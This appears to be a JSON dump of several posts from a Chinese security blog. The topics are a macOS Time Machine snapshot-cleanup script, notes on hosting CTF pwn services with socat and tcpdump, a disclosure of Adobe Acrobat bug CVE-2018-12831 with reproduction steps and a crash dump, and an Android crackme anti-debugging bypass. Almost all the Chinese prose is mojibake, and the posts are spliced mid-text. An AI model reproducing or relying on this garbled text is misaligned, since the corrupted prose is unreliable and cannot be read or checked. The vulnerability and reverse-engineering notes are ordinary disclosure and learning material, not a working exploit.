é™¤ã€‚ä¸‹é¢æ˜¯æˆ‘çš„æµ‹è¯•â€¦ 12345678910111213141516171819202122232425262728293031# muhe @ muheMacBookPro in ~ [17:00:12] C:64$ tmutil listlocalsnapshotsUsage: tmutil listlocalsnapshots &lt;mount_point&gt;# muhe @ muheMacBookPro in ~ [17:00:25] C:64$ tmutil listlocalsnapshots /com.apple.TimeMachine.2018-03-09-011841com.apple.TimeMachine.2018-03-13-181325com.apple.TimeMachine.2018-03-13-191609com.apple.TimeMachine.2018-03-13-202018com.apple.TimeMachine.2018-03-13-211538com.apple.TimeMachine.2018-03-13-221327com.apple.TimeMachine.2018-03-14-001309com.apple.TimeMachine.2018-03-14-012200com.apple.TimeMachine.2018-03-14-030328com.apple.TimeMachine.2018-03-14-050253com.apple.TimeMachine.2018-03-14-064523com.apple.TimeMachine.2018-03-14-104506com.apple.TimeMachine.2018-03-14-115132com.apple.TimeMachine.2018-03-14-142419com.apple.TimeMachine.2018-03-14-152240com.apple.TimeMachine.2018-03-14-162236com.apple.TimeMachine.2018-03-14-163225# muhe @ muheMacBookPro in ~ [17:00:32]$ tmutil deletelocalsnapshots 2018-03-09-011841Deleted local snapshot '2018-03-09-011841'# muhe @ muheMacBookPro in ~ [17:01:12]$ tmutil deletelocalsnapshots 2018-03-13-181325Deleted local snapshot '2018-03-13-181325' å†™äº†ä¸ªè„šæœ¬ 123456789101112131415161718192021222324#!/usr/bin/pythonimport subprocesscmd = 'tmutil listlocalsnapshots /'process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)out, err = process.communicate()out = out.split('\\n')local_snapshots = []for item in out: local_snapshots.append(item.split('.')[-1])for item in local_snapshots: try: cmd = 'tmutil deletelocalsnapshots {0}'.format(item) print ('[*] Deleting localsnapshot : {0}'.format(item)) process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) out, err = process.communicate() print ('[*] Localsanpshot {0} deleted'.format(item)) except Exception as e: print ('[!] Error on {0} , {1}'.format(item, e))print ('[*] All done, have a nice day :)') 0x03 : å‚è€ƒ10.13 å‡çº§åï¼Œå¤šå‡ºäº†å¾ˆå¤§ä¸€å—éšè—ç©ºé—´ï¼Œä¸èƒ½ç”¨ä¹Ÿåˆ é™¤ä¸äº†ï¼Ÿâ€“ v2ex","link":"/2018/03/14/%E6%8B%AF%E6%95%91macOS-High-sierra%E7%9A%84%E7%A1%AC%E7%9B%98%E7%A9%BA%E9%97%B4/"},{"title":"æ¯”èµ›è¿ç»´æ‚è®°","text":"0x00 : å‰è¨€åˆæ˜¯ä¸€å±Šæ ¡èµ›äº†ã€‚å­¦å¼Ÿåœ¨é…ç¯å¢ƒçš„æ—¶å€™ä¸€ç›´é—®æˆ‘ç›¸å…³çš„é—®é¢˜ï¼Œç„¶è€Œæˆ‘ä»¥å‰çš„ç¬”è®°æ‰¾ä¸åˆ°äº†ï¼Œä»Šå¤©å¶ç„¶æ‰¾åˆ°äº†ï¼Œç´¢æ€§ç›´æ¥å‘å‡ºæ¥å§ã€‚è¿™æ˜¯ç¬¬ä¸€æ¬¡å‚åŠ æ ¡èµ›æ—¶å€™é…ç¯å¢ƒçš„è®°å½•äº†ï¼Œä¸¤å¹´å‰å§ï¼Œæ¯”è¾ƒnaiveï¼Œæœ‰å¾ˆå¤šåœ°æ–¹ä¸å…¨é¢ã€‚ 0x01 åŸºæœ¬ä¿¡æ¯æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯uname -a æˆ–è€… cat /proc/version æŸ¥çœ‹centOS ç³»ç»Ÿç‰ˆæœ¬ rpm -q centos-release 0x02 æ›´æ–°(centOSä¸ºä¾‹)1.å¤‡ä»½1mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 2.ä¸‹è½½yumé…ç½®æ–‡ä»¶12cd /etc/yum.repos.d/ wget http://mirrors.163.com/.help/CentOS6-Base-163.repo 3.ç”Ÿæˆç¼“å­˜1yum makecache 4.æ›´æ–°1yum -y update å®‰è£…32ä½åº“ 1sudo yum install xulrunner.i686 0x03 å®ˆæŠ¤è¿›ç¨‹çš„é…ç½®1.å®‰è£…1yum -y install xinetd 2.é…ç½®/etc/services ä¸‹å…ˆæ·»åŠ è‡ªå·±çš„æœåŠ¡ç«¯å£ä¿¡æ¯/etc/xinetd.d/ ä¸‹æ·»åŠ è‡ªå·±çš„æœåŠ¡ 123456789service pwn_test{ disable = no //æ‰“å¼€ port = 50001 socket_type = stream server = /home/pwn100/pwn100 wait = no user = pwn_user} ä¹‹åé‡å¯æœåŠ¡å°±å¥½äº†service xinetd restart 0x04 socat1.123wget â€“no-cache http://www.convirture.com/repos/definitions/rhel/6.x/convirt.repo -O /etc/yum.repos.d/convirt.repo yum makecacheyum install socat 2.å¦‚æœè¦socatå»é…ç½®pwnæœåŠ¡ï¼Œå†™ä¸€ä¸ªbashè„šæœ¬ 1nohup socat TCP4-LISTEN:10001,fork EXEC:./pwn100 &gt;/dev/null 2&gt;&amp;1 &amp; ç»™xæƒé™åè¿è¡Œå³å¯ 0x05 å…¶ä»–æ‚é¡¹é…ç½®å®‰è£…32bitåº“ 1yum install libstdc++-devel.i686 glibc.i686 libgcc.i686 libstdc++.i686 glibc-devel.i686 0x06 æŠ“æµé‡123456#!/bin/sh file_path=\"/home/sycfiles/pwn_log/\"file_name=`date \"+%H%M\"`path=$file_path$file_namekillall tcpdump233nohup tcpdump233 -i eth1 tcp port 50001 -w $path &gt;/dev/null 2&gt;&amp;1 &amp; 12#0 */1 * * * ç”¨æˆ· è„šæœ¬è·¯å¾„0 */1 * * * root /root/pwn_log.sh 0x07 å…¶ä»–ä¸»è¦æ˜¯æ³¨æ„ç›®å½•ã€æ–‡ä»¶æƒé™ä»¥åŠforkç‚¸å¼¹ä¹‹ç±»çš„æ…å±æ£è¡Œä¸ºçš„é™åˆ¶ï¼Œæœ€å¥½è¿˜æ˜¯dockerå§ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚","link":"/2018/06/16/%E6%AF%94%E8%B5%9B%E8%BF%90%E7%BB%B4%E6%9D%82%E8%AE%B0/"},{"title":"ç”±CVE-2018-12831å¼•å‘çš„ä¸€äº›æ€è€ƒ","text":"0x00 : å‰è¨€è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„caseï¼Œåœ¨æˆ‘è¿˜åœ¨å­¦æ ¡çš„æ—¶å€™å¯¹Adobe Readeræ—¥å¸¸é€†å‘çš„æ—¶å€™æ„å¤–å‘ç°çš„ä¸€ä¸ªUAFæ¼æ´ï¼Œå¾ˆä¸å¹¸çš„æ˜¯æ— æ³•åˆ©ç”¨ï¼›ä½†æ˜¯æœ‰è¶£çš„æ˜¯ä»–çš„è§¦å‘æ–¹å¼ï¼Œåœ¨åé¢çš„å·¥ä½œä¸­ï¼Œæˆ‘åœ¨Foxitä¸­æ„å¤–å‘ç°äº†ç±»ä¼¼çš„é—®é¢˜ï¼Œå°±åœ¨æ˜¨å¤©ï¼ŒAdobeæ›´æ–°æœ€æ–°è¡¥ä¸ä¹‹åï¼Œä¹Ÿå‘ç°äº†ä¸€ä¸ªç±»ä¼¼çš„UAF(0day,å·²æäº¤ç»™å‚å•†)ï¼Œè¿™ä¸ª0dayä¸åœ¨æœ¬æ–‡è®¨è®ºèŒƒå›´ä¹‹å†…ã€‚ 0x01 : æ¼æ´æƒ…å†µæ¼æ´çš„åŸºæœ¬ä¿¡æ¯å¦‚ä¸‹:1Adobe Acrobat and Reader versions 2018.011.20063 and earlier, 2017.011.30102 and earlier, and 2015.006.30452 and earlier have an use after free vulnerability. Successful exploitation could lead to arbitrary code execution. æ˜¯ä¸€ä¸ªå¾ˆé¸¡è‚‹çš„UseAfterFreeçš„é¸¡è‚‹æ¼æ´ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ— æ³•åˆ©ç”¨ :( è¿™ä¸ªæ¼æ´å‘ç°çš„å¾ˆæ„å¤–ï¼Œç®—æ˜¯æ— å¿ƒæ’æŸ³ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å¯ä»¥ä½¿ç”¨vbsè„šæœ¬è°ƒç”¨ä¸€äº›windowsçš„apiï¼Œç„¶åå»å®Œæˆä¸€äº›çª—å£æ“ä½œï¼Œä¸‹é¢æ¥çœ‹ä¸€ä¸‹è¿™æ®µvbsè„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546REM: Save a Pdf as JPEG. REM:Also Multipage PDF will can be changed. Then every page will be saved as single JPEG REM: The Filename you can change to your needs. REM: If you use Drag&amp;drop or Filename as command REM: line argument the script will work with this file.'*********Settings in File**************************FileNM = &quot;C:\\Users\\muhe\\Desktop\\x.pdf&quot; '//Filename for File to transfer if NO argument is given'****************************************************set WshShell = CreateObject (&quot;Wscript.Shell&quot;)set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;)Set objArgs = WScript.Argumentsif objArgs.Count = 1 then FileNM = ObjArgs(0)Info = &quot;Save as JPEG&quot;&amp;VbCr&amp;_ &quot;File Name: &quot;&amp;FileNM &amp;vbCr&amp;&quot; Delete existing JPEG FILES with the same Name before!&quot;&amp;vbcr&amp;&quot; Start now?&quot;OK = MsgBox(Info, vbQuestion+vbYesNo,&quot;Insert Files&quot;) : if OK = vbNo then WScript.quit'//Start or switch to AcrobatWshShell.run &quot;Acrobat.exe&quot;While not WshShell.AppActivate(&quot;Adobe Acrobat&quot;) : Wscript.Sleep 1000 : WendSet gApp = CreateObject(&quot;AcroExch.App&quot;)if not fs.FileExists(FILENM) then MsgBox &quot;Ups! &quot; &amp; FileNM &amp; &quot; doesn't exist? &quot; &amp; &quot;Try new!&quot;, vbExclamation WScript.quitend ifSet BASFL = CreateObject(&quot;AcroExch.pdDoc&quot;)OK = BASFL.Open(FileNM) '//Open the PDF-Fileif not OK Then if MsgBox(&quot;Error open Basic File&quot;) then Wscript.quitBASFL.OpenAVDoc(mid(FileNM,InstrRev(FileNM,&quot;\\&quot;)+1)) '// get the PDF-File into viewWScript.Sleep 1000'// to get this part working reliable(!) use WinAPI, WMI, or AutoITX.dll to check the forground windowWshShell.SendKeys &quot;^+s&quot; '// send keys for SaveAsWScript.Sleep 1000WshShell.SendKeys &quot;{tab}&quot; '// goto FiletypeWScript.Sleep 500WshShell.SendKeys &quot;J&quot; '// switch filetype zu JPEGWScript.Sleep 500WshShell.SendKeys &quot;{tab}{Enter}&quot; '// switsch to &quot;Save&quot; and saveWScript.Sleep 1000Set BASFL = nothing : set gApp = nothing è„šæœ¬æ¥è‡ªç½‘ä¸Šï¼Œå½“æ—¶æ™šä¸Šéšä¾¿çœ‹readeræ”»å‡»é¢çš„æ—¶å€™éšæ‰‹æ‰¾åˆ°çš„ä¸€ä¸ªè½¬æ¢è„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬çš„åŠŸèƒ½çš„è°ƒç”¨Adobe Acrobat DC Proçš„è½¬æ¢æ¨¡å—ï¼ŒæŠŠpdfè½¬æˆå›¾ç‰‡ã€‚ å…¶å®è„šæœ¬çœ‹èµ·æ¥æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œè€Œä¸”æˆ‘ä½¿ç”¨çš„x.pdfä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šæ”¯æŒï¼Œéšä¾¿ä¸€ä¸ªpdfæ–‡ä»¶éƒ½å¯ä»¥è§¦å‘è¿™ä¸ªæ´ã€‚é—®é¢˜ä¸åœ¨äºå†…å­˜ï¼Œåœ¨äºé€»è¾‘ã€‚ è§¦å‘æ¼æ´ ç¬¬ä¸€æ¬¡è¿è¡Œvbsè„šæœ¬å¯åŠ¨è½¬æ¢ï¼Œæ­¤æ—¶æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œè¿™æ—¶å€™ä¸è¦killæ‰Acrobat.exeã€‚ ç„¶åå†æ¬¡è¿è¡Œvbsè„šæœ¬ï¼Œå› ä¸ºReaderæ˜¯å•è¿›ç¨‹çš„ï¼Œå¤šçš„tabæ ‡ç­¾ä¼šä»¥å•ç‹¬çš„çº¿ç¨‹ä½“ç°ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ä½ ä¸ä¼šçœ‹åˆ°ç¬¬äºŒæ¬¡è¢«æ‰“å¼€çš„æ–‡ä»¶ã€‚ å…³é—­å·²æ‰“å¼€çš„pdfæ ‡ç­¾ crash 123456789101112131415161718192021222324250:029&gt; g(874.74c): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.*** ERROR: Symbol file could not be found. Defaulted to export symbols for Acrobat.dll -Acrobat_6c400000!DllCanUnloadNow+0x591d3:6c4d7318 8b4118 mov eax,dword ptr [ecx+18h] ds:002b:2b208bb0=?? ??????0:000:x86&gt; reax=2b208b98 ebx=00000001 ecx=2b208b98 edx=03c51138 esi=2b96edb0 edi=0000000 1eip=6c4d7318 esp=0021f308 ebp=0021f308 iopl=0ccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b2Acrobat_6c400000!DllCanUnloadNow+0x591d3:6c4d7318 8b4118 mov eax,dword ptr [ecx+18h] ds:002b:2b208bb0=????????0:000:x86&gt; dd ecx2b208b98 ???????? ???????? ???????? ????????2b208ba8 ???????? ???????? ???????? ????????2b208bb8 ???????? ???????? ???????? ????????2b208bc8 ???????? ???????? ???????? ????????2b208bd8 ???????? ???????? ???????? ????????2b208be8 ???????? ???????? ???????? ????????2b208bf8 ???????? ???????? ???????? ????????2b208c08 ???????? ???????? ???????? ???????? å…·ä½“çš„æ¼æ´åˆ†æçš„ç»†èŠ‚ä¸å†ç»†è¿°ï¼Œé€†å‘çš„å·¥ä½œé‡æ¯”è¾ƒå¤§ï¼Œä¸»è¦æ˜¯ç®¡ç†PDDocå¯¹è±¡çš„é—®é¢˜ã€‚å½“æ—¶å‚å•†ä¹Ÿè¯´è¿™ä¸ªé—®é¢˜å¥½åƒæœ‰ç‚¹å¤æ‚ï¼Œä»–ä»¬éœ€è¦åšæ›´å¤šçš„æµ‹è¯•å·¥ä½œï¼Œæ‰€ä»¥å·®ä¸å¤šä»äº”æœˆæŠ¥å‘Šï¼Œåˆ°ä¿®å¤ï¼Œæˆ‘ç­‰äº†å·®ä¸å¤šå››äº”ä¸ªæœˆçš„æ ·å­:( 0x02 : ç±»ä¼¼çš„æƒ…å†µå¾ˆæœ‰æ„æ€çš„æ˜¯ï¼Œæˆ‘åœ¨Adobe Readerç³»åˆ—ã€Foxitéƒ½å‘ç°è¿‡ç±»ä¼¼çš„æƒ…å†µï¼Œæ­£å¸¸çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ“ä½œé€»è¾‘ä¸æ­£å¸¸ï¼Œå¯¼è‡´ä¸‹å±‚ä»£ç äº§ç”Ÿå´©æºƒï¼Œæ¯”å¦‚ä¸€äº›æ•°æ®ä¸åŒæ­¥çš„æƒ…å†µ(Foixtçš„ä¸€ä¸ªæ´)ã€‚ è¿˜æœ‰å°±æ˜¯SourceTreeçš„Windowsç‰ˆä¹Ÿæœ‰è¿™æ ·çš„é—®é¢˜ï¼Œä½†æ˜¯æ˜¯ä¸ªç©ºæŒ‡é’ˆï¼Œæ²¡äººç†å§ä¼°è®¡ã€‚ å°±æ˜¯åœ¨è¿›è¡Œé…ç½®çš„æ—¶å€™ï¼Œä¸æŒ‰ç…§ä»–æŒ‡ç¤ºçš„é€»è¾‘å‘ä¸‹è¿›è¡Œï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªç©ºæŒ‡é’ˆã€‚(ä¾ç„¶æ²¡æœ‰ä¿®å¤ï¼Œå‘äº†é‚®ä»¶ä¹Ÿä¸ç† T_T) æœ¬æœˆ(2018.12)æˆ‘åˆäº¤äº†ä¸€ä¸ªAdobe Acrobat DC Proçš„è¶Šç•Œè¯»ï¼Œä¹Ÿæ˜¯è¿™ç§ç±»ä¼¼çš„æ¼æ´(é¸¡è‚‹åˆæ²¡ç”¨)ï¼Œå®Œå…¨æ­£å¸¸çš„ä»£ç ã€æ–‡ä»¶ï¼Œåªæ˜¯å› ä¸ºæ“ä½œé€»è¾‘ä¸å¯¹å¯¼è‡´äº†ç¨‹åºå´©æºƒã€‚è¯´å®è¯æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ˜ç™½ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¹ˆå¥‡æ€ªçš„bugï¼Œæˆ‘æ¯æ¬¡éƒ½æ˜¯åœ¨æ‰¾æ”»å‡»é¢ã€æµ‹è¯•è‡ªå·±å†™çš„ä¸œè¥¿çš„æ—¶å€™å‘ç°çš„è¿™äº›å¥‡æ€ªçš„bugã€‚ 0x03 : å¼•å‘çš„ä¸€ç‚¹æ€è€ƒåœ¨ç¨‹åºçš„å¤æ‚åº¦å‰§å¢çš„ç°åœ¨ï¼Œç”¨äº†å¾ˆå¤šè®¾è®¡æ¨¡å¼ã€æ¡†æ¶ç³…åˆçš„ç¨‹åºçš„ç¡®å¾ˆéš¾ä¿è¯æ²¡æœ‰ç±»ä¼¼çš„bugå‡ºç°ï¼Œæ¯”å¦‚Adobeè¿™ç§æ”¯æŒå¾ˆå¤šåŠŸèƒ½ã€æ’ä»¶çš„PDFé˜…è¯»å™¨ï¼Œåœ¨é€†å‘çš„æ—¶å€™å°±å‘ç°äº†ä¸€å±‚åˆä¸€å±‚çš„å°è£…ä»¥åŠä¸€äº›è®¾è®¡æ¨¡å¼ï¼Œæå¾—äººä¸€ä¸ªå¤´ä¸¤ä¸ªå¤§ã€‚ ä¸Šå±‚çš„æ“ä½œé€»è¾‘å¯¹ä¸‹å±‚ä»£ç çš„å½±å“æœ‰æ—¶å€™çœŸçš„å¾ˆéš¾è€ƒè™‘å‘¨å…¨ï¼Œæˆ–è€…è¯´æµ‹è¯•çš„æ—¶å€™ä¹Ÿæ²¡å¾€è¿™ä¸ªæ–¹å‘æƒ³ï¼Œæ‰€ä»¥å¯¼è‡´ä¸€äº›bugçš„å‡ºç°ï¼Œä¸è¿‡æˆ‘ä¼°è®¡é™¤äº†å®‰å…¨ç ”ç©¶å‘˜ä¹Ÿæ²¡äººå»å¾€è¿™ä¸ªæ–¹å‘æ :( æˆ‘ä¸ªäººä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¼€å‘ç›¸å…³çš„ç»éªŒï¼Œå°±å­˜åœ¨ä¸€ä¸ªç–‘é—®:è¿™éƒ¨åˆ†é—®é¢˜æ€ä¹ˆé¿å…oråŠæ—©å‘ç°? æœ€è¿‘ä¹Ÿçœ‹åˆ°Jamesçš„å‡ ä¸ªæœ¬åœ°ææƒçš„æ´ï¼Œä¸ç”±æ„Ÿå¹é€»è¾‘æ´æ˜¯çœŸç‰›é€¼ï¼Œä»¥åè¿˜æ˜¯è¦å¤šå¾€è¿™ä¸ªæ–¹å‘æƒ³æƒ³ã€‚ä¸è¿‡åƒReaderè¿™ç§æ€è·¯é€»è¾‘æ´å°±åªåœ¨ç©¿sanboxçš„æ—¶å€™æœ‰è§è¿‡ï¼Ÿ è‡³ä»Šè¿˜è®°å¾—zdiä¹‹å‰ä¸€æ³¢åˆ©ç”¨ __defGetter__å’Œ__defSetter__è°ƒç”¨åˆ°ç‰¹æƒapiçš„é‚£å¥—éªšæ“ä½œâ€¦ä¸è¿‡ä¹Ÿè¢«å°çš„å·®ä¸å¤šäº†ï¼ŒåŸºæœ¬gg :( æœ€ååæ§½ä¸€ä¸‹ï¼Œæ´å¥½éš¾æŒ–â€¦ 0x04 : å…¶ä»–äººçš„å·¥ä½œQuBo &amp;&amp; heige åœ¨kcon2018ä¸Šçš„è®®é¢˜æ¶‰åŠåˆ°äº†ä¸€å°éƒ¨åˆ†è¿™æ ·çš„ï¼Œåªæ˜¯ä»–ä»¬åšçš„æ›´å®Œå–„ï¼Œåœ¨fuzzå†…å­˜ç ´åæ¼æ´ã€åŠ å…¥äº†æ“ä½œé€»è¾‘çš„fuzzï¼Œå°±äº§ç”Ÿäº†ä¸€äº›å¾ˆå¥‡æ€ªçš„caseï¼Œæ¯”å¦‚ç‚¹å‡»xxä¸‹å´©æºƒï¼Œä»¥xxåˆ†è¾¨ç‡æ‰“å¼€ç„¶åxxxå´©æºƒâ€¦ å¾ˆæœ‰æ„æ€çš„åˆ†äº«ï¼Œè™½ç„¶è¿™ç±»æ´åˆ©ç”¨çš„å¯èƒ½æ€§å¾®ä¹å…¶å¾®ï¼ˆä¸ªäººè®¤ä¸ºæ²¡æœ‰ï¼‰ï¼Œä½†æ˜¯å¾ˆæœ‰è¶£ï¼Œä¹Ÿæ˜¯æ¯ç‡¥çš„æ¼æ´æŒ–æ˜ç”Ÿæ´»ä¸­çš„ä¸€ä¸ä¹è¶£ã€‚ 0x05 : è‡´è°¢ä¿¡æ¯Zhenjie Jia of Qihoo 360 Vulcan Team (CVE-2018-12831)","link":"/2018/12/13/%E7%94%B1CVE-2018-12831%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"title":"ç¬¬ä¸€ä¸ªandroid cmè°ƒè¯•åˆ†æ","text":"0x00:å†™åœ¨å‰é¢ä¸€ç›´æƒ³å…¥é—¨Androidå®‰å…¨ï¼Œå½“æ—¶æ˜¯æå®¢å¤§æŒ‘æˆ˜å‡ºé¢˜çš„æ—¶å€™ï¼Œè¢«cxè¡¨å“¥ç”©é”…å¼ºè¡Œå»å­¦äº†ç‚¹androidçš„å¼€å‘ï¼Œä¹‹åæ…¢æ…¢æ¥è§¦ï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚cxè¡¨å“¥è¯´å…ˆä»é€†å‘åˆ†æå…¥é—¨å§ï¼Œä¹‹åå¯ä»¥æåŠ å›º/æ¼æ´æ–¹å‘ã€‚è¿™ç¯‡æ–‡ç« æ˜¯åœ¨å­¦ä¹ è’¸ç±³çš„æ–‡ç« ä¸ƒæ­¦å™¨çš„ä¸€ä¸ªè®°å½•ã€‚ 0x01: è¿™æ¬¡è®°å½•çš„æ˜¯2014é˜¿é‡Œç§»åŠ¨æŒ‘æˆ˜èµ›é‡Œçš„ä¸€ä¸ªç®€å•çš„cmçš„åˆ†æï¼Œä¸»è¦æ˜¯nativeå±‚çš„è°ƒè¯•å’Œå¯¹ç®€å•åè°ƒè¯•çš„bypassã€‚å› ä¸ºåŸæ¥è‡ªç”¨çš„ä¸‰æ˜Ÿæ”¾å®¶é‡Œäº†ï¼Œå°±åªèƒ½ä½¿ç”¨æ¨¡æ‹Ÿå™¨æ¥æäº†ï¼Œå‘è¿˜æ˜¯ä¸å°‘ã€‚ æœ¬æ¥æˆ‘æ˜¯æƒ³ç”¨Genymotionçš„ï¼Œä½†æ˜¯è¿™ä¸ªæ¨¡æ‹Ÿå™¨æ˜¯x86æ„æ¶,IDAçš„è°ƒè¯•çš„serverå¹¶æ²¡æœ‰æ”¯æŒçš„ï¼Œåªèƒ½ç”¨Android Studioè‡ªå¸¦çš„æ¨¡æ‹Ÿå™¨ã€‚ ä½¿ç”¨æ¨¡æ‹Ÿå™¨è°ƒè¯•soé‡Œçš„ä»£ç æ—¶æœ‰é—®é¢˜(åé¢ä¼šæåˆ°) å¯¹äºæˆ‘è¿™æ ·çš„æ–°æ‰‹ï¼Œæˆ‘ä¸€èˆ¬ä¼šæŠŠapkæ‹–è¿›jebç›´æ¥åˆ†æçœ‹çœ‹ï¼Œè¿™ä¸ªapkçš„éªŒè¯æ˜¯åœ¨soä¸­åšçš„éªŒè¯ï¼Œæ‰€ä»¥ä½¿ç”¨IDAå¯¹soåšåˆæ­¥çš„åˆ†æã€‚ 0x02:æ‰¾åˆ°éªŒè¯çš„å‡½æ•° æ ¹æ®ä»¥å‰æpcç«¯çš„ç»éªŒï¼Œä¸‹ä¸€æ­¥ç›´æ¥èµ·è°ƒè¯•å™¨ï¼Œå¯¹è¿™ä¸ªå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œå•æ­¥è·Ÿå°±å¥½äº†ã€‚ä½†æ˜¯è¿™ä¸ªç¨‹åºåœ¨IDA attachä¸Šä¹‹åç¨‹åºå°±é€€å‡ºäº†ï¼Œéœ€è¦å¯¹JNI_Onload()å‡½æ•°è¿›è¡Œè°ƒè¯•åˆ†æã€‚æ ¹æ®è’¸ç±³çš„æ–‡ç« ï¼Œæ­¥éª¤å¦‚ä¸‹ é¦–å…ˆæ˜¯ä¸Šä¼ IDAçš„serveråˆ°æ¨¡æ‹Ÿå™¨ä¸­ï¼Œè¿™é‡Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜æç¤ºåªè¯»ï¼Œå¯¹åº”çš„è§£å†³æ–¹æ³•æ˜¯ 12root@generic:/ # umount /root@generic:/ # mount -o remount rw / ä¹‹åå†ä¸Šä¼ è¿è¡Œå°±å¯ä»¥å•¦ã€‚ç„¶åï¼Œéœ€è¦ç«¯å£è½¬å‘ adb forward tcp:23946 tcp:23946ä¸€èˆ¬IDAå»attachçš„æ—¶å€™è¿™ä¸ªå‡½æ•°æ—©å°±æ‰§è¡Œè¿‡äº†ï¼Œæ‰€ä»¥éœ€è¦è°ƒè¯•JNI_Onload()ï¼›å› ä¸ºéœ€è¦ç”¨åˆ°jdbï¼Œæ‰€ä»¥éœ€è¦æ‰“å¼€ddmsã€‚ä¹‹åå†ä½¿ç”¨adbä»¥è°ƒè¯•çš„æ¨¡å¼å¯åŠ¨ç¨‹åºadb shell am start -D -n com.yaotong.crackme/.MainActivity IDAé‡Œattach è®¾ç½®è°ƒè¯•é€‰é¡¹åF9 æ­¤æ—¶ä½¿ç”¨jdbå·¥å…·æ¢å¤ç¨‹åºjdb.exe -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700ï¼›ç„¶åå¯¹å«æœ‰éªŒè¯ç®—æ³•çš„soçš„JNI_Onload()æ–¹æ³•ä¸‹æ–­ç‚¹ï¼ŒF9ï¼Œå°±æ–­ä¸‹æ¥äº†ã€‚ 0x03:ä½¿ç”¨IDAè°ƒè¯•æ–¹ä¾¿åœ¨äºï¼Œä½¿ç”¨På°†ä»£ç å—è¯†åˆ«æˆå‡½æ•°åï¼Œå¯ä»¥ç›´æ¥F5ã€‚å•æ­¥æ‰§è¡Œåˆ° ä¹‹åï¼Œå°±è·‘é£äº†ï¼Œåº”è¯¥æ˜¯æœ‰åè°ƒè¯•ï¼ŒF7è¿›å»çœ‹çœ‹æ˜¯ä»€ä¹ˆåè°ƒè¯•ã€‚ åº”è¯¥æ˜¯åˆ›å»ºå­è¿›ç¨‹å»æ£€æµ‹æœ‰æ²¡æœ‰è°ƒè¯•å™¨äº†ã€‚ soä¸­çš„åè°ƒè¯•ç­–ç•¥åº”è¯¥å’Œlinuxé‚£äº›å·®ä¸å¤šï¼Œè¿™ä¸ªsoä¸­çš„æ£€æµ‹æ–¹å¼æ˜¯ï¼Œæ‰“å¼€/proc/[pid]/statusæ–‡ä»¶ï¼Œæ£€æµ‹tracerpidçš„å€¼æ˜¯ä¸æ˜¯0ã€‚é‚£ä¹ˆå¯¹åº”çš„ç­–ç•¥æœ‰ä¸¤ç§ï¼Œè¦ä¹ˆè°ƒè¯•çš„æ—¶å€™åŠ¨æ€æ”¹å¯„å­˜å™¨ï¼Œæˆ–è€…æ”¹è·³ï¼›æˆ–è€…ä¸€åŠ³æ°¸é€¸ï¼Œç›´æ¥patchæ‰è¿™ä¸ªsoã€‚åœ¨åˆ†æäº†è¿™ä¸ªsoåè°ƒè¯•æ‰€åœ¨çš„å‡½æ•°åï¼Œæˆ‘é€‰æ‹©åç§æ–¹æ¡ˆ æ­»å¾ªç¯è°ƒç”¨æ¥æ£€æµ‹è°ƒè¯•ï¼Œè¿˜æ˜¯patchæ¥çš„æ–¹ä¾¿äº›ã€‚ åœ¨è°ƒè¯•çš„æ—¶å€™æˆ‘é‡åˆ°è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼ŒF7/F8éƒ½æ²¡æ³•æ‰§è¡Œä¸‹å»ã€‚ é—®äº†cxè¡¨å“¥åï¼Œè¡¨å“¥è¯´è¿™æ˜¯æ¨¡æ‹Ÿå™¨æ‰æœ‰çš„é—®é¢˜â€¦åœ¨å‡ºé—®é¢˜çš„ä»£ç ä¸Šä¸‹æ–­ï¼Œç„¶åF9è¿‡å»å°±å¥½äº†ã€‚ è¿™æ ·çš„ç¡®å¯ä»¥è§£å†³é—®é¢˜ï¼Œä½†æ˜¯åœ¨è°ƒè¯•çš„æ—¶å€™é‡åˆ°å¥½å‡ æ¬¡è¿™æ ·çš„é—®é¢˜ï¼Œæ¯æ¬¡é‡åˆ°äº†éƒ½è¦å…¨éƒ¨é‡æ–°æ¥è¿‡ï¼Œå¤ªéº»çƒ¦äº†ï¼Œè¿˜æ˜¯çœŸæœºè°ƒè¯•å¥½QAQ 0x04:patchè¿™ä¸ªsoçš„æ—¶å€™ï¼Œè’¸ç±³ä½¿ç”¨çš„é‚£ä¸ªIDAçš„æ’ä»¶æˆ‘æ²¡æ‰¾åˆ°ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©åç¼–è¯‘è¿™ä¸ªapkï¼Œç„¶åä¿®æ”¹äº†soæ–‡ä»¶åï¼Œé‡æ‰“åŒ…ç­¾åå¼„å›å» =ã€‚= ä¿®æ”¹0x16B8å¤„çš„æŒ‡ä»¤å°±å¥½äº†,è¿™é‡Œé‡‡ç”¨è’¸ç±³çš„æ–¹æ¡ˆï¼Œä½¿ç”¨movs 